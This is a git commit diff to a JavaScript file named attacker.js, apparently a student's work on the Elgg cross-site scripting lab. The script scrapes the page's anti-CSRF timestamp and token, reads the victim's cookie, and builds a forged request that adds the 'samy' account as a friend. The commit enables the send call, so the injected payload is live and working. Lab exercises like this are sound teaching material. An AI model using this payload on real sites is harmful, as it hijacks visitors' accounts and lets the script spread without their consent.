70c9b4892a5540b55076b842d661934e0c03755d
EnzeXu <xue20@wfu.edu>
2021-12-06 06:04:30 -0500

    sth

--- js/attacker.js
+++ js/attacker.js
@@ -4,10 +4,10 @@ console.log(document.all[33].attributes[0].nodeValue);
 
 let __elgg_ts = String(document.all[35].attributes[0].nodeValue).substr(50, 10);
 let __elgg_token = String(document.all[35].attributes[0].nodeValue).substr(74, 22);
-let samy_id = 47;
+let samy_id = String(47);
 let cookie = document.cookie;
 let me = String(document.all[33].attributes[0].nodeValue).substr(40,);
-console.log("samy_id = " + String(samy_id));
+console.log("samy_id = " + samy_id);
 console.log("cookie = " + cookie);
 console.log("__elgg_ts = " + __elgg_ts);
 console.log("__elgg_token = " + __elgg_token);
@@ -17,7 +17,7 @@ if (me != "samy") {
 	var Ajax=null;
 	// Construct the header information for the HTTP request
 	Ajax=new XMLHttpRequest();
-	let http_url = "http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts="+__elgg_ts+"&__elgg_token="+__elgg_token;
+	let http_url = "http://www.xsslabelgg.com/action/friends/add?friend="+samy_id+"&__elgg_ts="+__elgg_ts+"&__elgg_token="+__elgg_token;
 	console.log(http_url);
 	//Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
 	Ajax.open("POST",http_url,true);
@@ -30,5 +30,8 @@ if (me != "samy") {
 	// from LiveHTTPHeaders.
 	var content="name=..&description=...&guid="; // You need to fill in the details.
 	// Send the HTTP POST request.
-	//Ajax.send(content);
+	Ajax.send(content);
+}
+else {
+	console.log("I am samy, I don't need to be my friend.");
 }
